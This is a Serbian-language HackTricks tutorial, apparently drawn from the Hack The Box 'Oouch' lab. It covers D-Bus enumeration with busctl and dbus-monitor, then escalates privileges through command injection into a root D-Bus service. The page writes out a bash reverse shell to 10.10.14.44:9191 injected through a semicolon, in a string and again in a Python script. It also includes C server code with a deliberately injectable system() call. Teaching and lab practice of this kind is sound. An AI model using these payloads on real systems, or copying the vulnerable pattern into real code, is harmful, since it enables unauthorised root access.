# D-Bus Enumeracija & Command Injection Privilege Escalation

{% hint style="success" %}
Naučite & vežbajte AWS Hakovanje:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Stručnjak (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite & vežbajte GCP Hakovanje: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Stručnjak (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **GUI enumeracija**

D-Bus se koristi kao posrednik za međuprocesnu komunikaciju (IPC) u Ubuntu desktop okruženjima. Na Ubuntu-u, primećeno je istovremeno delovanje nekoliko autobusa poruka: sistemski autobus, koji se uglavnom koristi od strane **privilegovanih servisa za izlaganje servisa relevantnih širom sistema**, i sesijski autobus za svakog prijavljenog korisnika, koji izlaže servise relevantne samo tom specifičnom korisniku. Fokus ovde je pretežno na sistemskom autobusu zbog njegove povezanosti sa servisima koji se izvršavaju sa većim privilegijama (npr. root) jer je naš cilj da povisimo privilegije. Primećeno je da arhitektura D-Bus-a koristi 'ruter' po sesijskom autobusu, koji je odgovoran za preusmeravanje klijentskih poruka ka odgovarajućim servisima na osnovu adrese koju su klijenti naveli za servis sa kojim žele da komuniciraju.

Servisi na D-Bus-u su definisani **objektima** i **interfejsima** koje izlažu. Objekti se mogu uporediti sa instancama klasa u standardnim OOP jezicima, pri čemu je svaka instanca jedinstveno identifikovana **putanjom objekta**. Ova putanja, slična putanji sistema datoteka, jedinstveno identifikuje svaki objekat izložen od strane servisa. Ključni interfejs za istraživačke svrhe je **org.freedesktop.DBus.Introspectable** interfejs, koji sadrži jednu metodu, Introspect. Ova metoda vraća XML reprezentaciju podržanih metoda objekta, signala i svojstava, sa fokusom ovde na metodama, dok se svojstva i signali izostavljaju.

Za komunikaciju sa D-Bus interfejsom, korišćena su dva alata: CLI alat nazvan **gdbus** za jednostavno pozivanje metoda izloženih od strane D-Bus-a u skriptama, i [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), Python baziran GUI alat dizajniran za enumeraciju dostupnih servisa na svakom autobusu i prikazivanje objekata sadržanih unutar svakog servisa.
```bash
sudo apt-get install d-feet
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)


U prvoj slici prikazane su usluge registrovane sa D-Bus sistemskim autobusom, sa **org.debin.apt** posebno istaknutim nakon odabira dugmeta System Bus. D-Feet upita ovu uslugu za objekte, prikazujući interfejse, metode, osobine i signale za odabrane objekte, što se vidi na drugoj slici. Takođe je detaljno prikazan potpis svake metode.

Značajna karakteristika je prikaz **identifikatora procesa (pid)** i **komandne linije** usluge, korisno za potvrdu da li usluga radi sa povišenim privilegijama, što je važno za relevantnost istraživanja.

**D-Feet takođe omogućava pozivanje metoda**: korisnici mogu uneti Python izraze kao parametre, koje D-Feet konvertuje u D-Bus tipove pre prosleđivanja usluzi.

Međutim, imajte na umu da **neki metodi zahtevaju autentikaciju** pre nego što nam dozvole da ih pozovemo. Ignorišemo ove metode, jer nam je cilj da povišemo privilegije bez pristupnih podataka u prvom redu.

Takođe imajte na umu da neke usluge upituju drugu D-Bus uslugu nazvanu org.freedeskto.PolicyKit1 da li korisnik sme izvršiti određene radnje ili ne.

## **Enumeracija komandne linije**

### Lista objekata usluge

Moguće je izlistati otvorene D-Bus interfejse sa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
#### Veze

[Od Vikipedije:](https://en.wikipedia.org/wiki/D-Bus) Kada proces uspostavi vezu sa autobusom, autobus dodeljuje vezi posebno ime autobusa koje se zove _jedinstveno ime veze_. Imena autobusa ovog tipa su nepromenljiva - garantovano se neće promeniti dok veza postoji - i, što je još važnije, ne mogu se ponovo koristiti tokom trajanja autobusa. To znači da nijedna druga veza sa tim autobusom nikada neće imati dodeljeno takvo jedinstveno ime veze, čak i ako isti proces zatvori vezu sa autobusom i kreira novu. Jedinstvena imena veza lako su prepoznatljiva jer počinju sa - inače zabranjenim - znakom dvotačke.

### Informacije o objektu servisa

Zatim, možete dobiti neke informacije o interfejsu sa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
### Lista interfejsa servisnog objekta

Potrebne su vam dozvole.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspektujte interfejs servisnog objekta

Primetite kako je u ovom primeru izabran najnoviji interfejs otkriven korišćenjem parametra `tree` (_videti prethodnu sekciju_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
### Interfejs za praćenje / snimanje

Sa dovoljno privilegija (samo privilegije `send_destination` i `receive_sender` nisu dovoljne) možete **pratiti komunikaciju D-Bus-a**.

Da biste **pratili** **komunikaciju**, morate biti **root**. Ako i dalje imate problema sa postavljanjem root-a, proverite [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) i [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

{% hint style="warning" %}
Ako znate kako da konfigurišete D-Bus konfiguracioni fajl da **omogućite ne-root korisnicima da prisluškuju** komunikaciju, molimo vas da **me kontaktirate**!
{% endhint %}

Različiti načini praćenja:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
U sledećem primeru, interfejs `htb.oouch.Block` se prati i **poruka "**_**lalalalal**_**" se šalje kroz nesporazum**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
#### Filtriranje svih šumova <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ako ima previše informacija na magistrali, prosledite pravilo podudaranja na sledeći način:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Više pravila može biti navedeno. Ako poruka odgovara _bilo kojem_ od pravila, poruka će biti odštampana. Na primer:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Pogledajte [D-Bus dokumentaciju](http://dbus.freedesktop.org/doc/dbus-specification.html) za više informacija o sintaksi pravila podudaranja.

### Više

`busctl` ima još više opcija, [**pronađite ih sve ovde**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Ranjivi scenario**

Kao korisnik **qtc unutar hosta "oouch" sa HTB-a** možete pronaći **neočekivani D-Bus konfiguracioni fajl** smešten u _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Napomena iz prethodne konfiguracije je da **će vam biti potrebno da budete korisnik `root` ili `www-data` da biste slali i primali informacije** putem ove D-BUS komunikacije.

Kao korisnik **qtc** unutar docker kontejnera **aeb4525789d8** možete pronaći neki dbus povezan kod u fajlu _/code/oouch/routes.py._ Ovo je interesantan kod:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kao što možete videti, **povezuje se sa D-Bus interfejsom** i šalje **"Block" funkciji** "client\_ip".

Na drugoj strani D-Bus veze radi neka C kompajlirana binarna datoteka. Ovaj kod **osluškuje** D-Bus vezu **za IP adresu i poziva iptables putem `system` funkcije** da blokira datu IP adresu.\
**Poziv `system` funkcije je namerno ranjiv na ubacivanje komandi**, tako da će niz komandi poput sledećeg kreirati povratni shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Iskoristite to

Na kraju ove stranice možete pronaći **kompletan C kod D-Bus aplikacije**. Unutar njega možete pronaći između linija 91-97 **kako su `D-Bus putanja objekta`** **i `ime interfejsa`** **registrovani**. Ove informacije će biti neophodne za slanje informacija preko D-Bus veze:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Takođe, u liniji 57 možete pronaći da je **jedina registrovana metoda** za ovu D-Bus komunikaciju nazvana `Block` (_**Zato će u narednom odeljku payloadi biti poslati objektu servisa `htb.oouch.Block`, interfejsu `/htb/oouch/Block` i nazivu metode `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Sledeći Python kod će poslati payload preko D-Bus veze metodi `Block` putem `block_iface.Block(runme)` (_napomena da je izvučen iz prethodnog dela koda_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl и dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
* `dbus-send` je alat koji se koristi za slanje poruka "Message Bus"
* Message Bus - Softver koji koriste sistemi kako bi olakšali komunikaciju između aplikacija. Povezan je sa Message Queue-om (poruke su poredane u sekvenci), ali u Message Bus-u se poruke šalju u modelu pretplate i takođe vrlo brzo.
* Tag "-system" se koristi da naznači da je u pitanju sistemsko obaveštenje, a ne sesijsko obaveštenje (podrazumevano).
* Tag "--print-reply" se koristi za ispisivanje naše poruke na odgovarajući način i prihvatanje bilo kakvih odgovora u ljudski čitljivom formatu.
* "--dest=Dbus-Interface-Block" Adresa Dbus interfejsa.
* "--string:" - Tip poruke koju želimo da pošaljemo interfejsu. Postoje različiti formati slanja poruka poput double, bytes, booleans, int, objpath. Od toga, "object path" je koristan kada želimo da pošaljemo putanju fajla interfejsu Dbus. U ovom slučaju možemo koristiti poseban fajl (FIFO) kako bismo prosledili komandu interfejsu pod imenom fajla. "string:;" - Ovo je da ponovo pozovemo object path gde postavljamo FIFO fajl/komandu za obrnutu ljusku.

_Napomena da u `htb.oouch.Block.Block`, prvi deo (`htb.oouch.Block`) se odnosi na servisni objekat, a poslednji deo (`.Block`) se odnosi na naziv metode._

### C kod

{% code title="d-bus_server.c" %}
```c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
{% endcode %}

## Reference
* [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Obuka AWS Red Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Obuka GCP Red Tim Ekspert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
